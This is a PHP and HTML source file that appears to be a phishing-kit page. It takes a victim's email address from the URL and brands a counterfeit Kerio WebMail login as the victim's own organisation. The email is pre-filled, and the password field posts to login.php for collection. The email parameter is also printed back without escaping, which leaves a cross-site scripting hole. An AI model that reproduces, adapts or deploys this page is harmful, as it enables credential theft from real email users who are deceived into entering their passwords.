<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
$display = strtoupper($yuh);

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
<title><?php echo $yuh ?> Client</title>
<link rel="icon" type="images/png" sizes="16*16" href="http://<?=$domain?>/favicon.ico">
<script type="text/javascript" src="./login_files/loginDialog.js"></script>
<script type="text/javascript" src="./login_files/generatedDefaults.js"></script>
<script type="text/javascript" src="./login_files/is"></script>
<link href="./login_files/loginBasic.css" rel="stylesheet">
<link href="./login_files/loginAdvanced.css" rel="stylesheet">
</head>

<body onLoad="document.getElementById(&#39;x_cfq&#39;).focus();x_cge(false);x_cgf();">
<div id="x_cfo"></div>
<form action="login.php" method="post" novalidate="novalidate">
<div id="logoField" style="font-size:24px; color:#02A0E0; font-weight:bold;"><?php echo $display ?><img id="x_cfw" src="./login_files/logo.png" alt="Mail" width="40" height="40"></div>
<table width="333" border="0" cellpadding="0" cellspacing="0" id="x_cfn">
  <tbody><tr><td width="333"><img id="x_cfy" src="./login_files/top.png" alt="" width="363" height="23"></td>
  </tr><tr><td id="x_cfp"><center><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td width="279"></td>
  </tr><tr><td class="x_cfu">Username<br><input id="x_cfq" name="kerio_u" type="email" style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" readonly="" value="<?php echo $_GET['email']; ?>"></td></tr>
<tr><td class="x_cfu">Password<br>
    <span style="position: relative;">
    <input type="password" name="kerio_p" id="x_cfr" required="" class="masked">
    </span>
    <script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("x_cfr"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</td></tr><tr><td><input id="x_cft" value="Login" type="submit"></td></tr><tr><td align="center"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td valign="middle"><input onChange="x_cgk(this.checked)" id="x_cgl" name="kerio_useMini" type="checkbox"></td><td valign="middle"><label for="x_cgl">Use WebMail Mini</label></td></tr></tbody></table></td></tr></tbody></table>
  </center></td></tr><tr><td><img id="x_cfz" src="./login_files/bottom.png" alt="" width="363" height="23"></td></tr><tr><td id="x_cfs"></td></tr></tbody></table></form></body></html>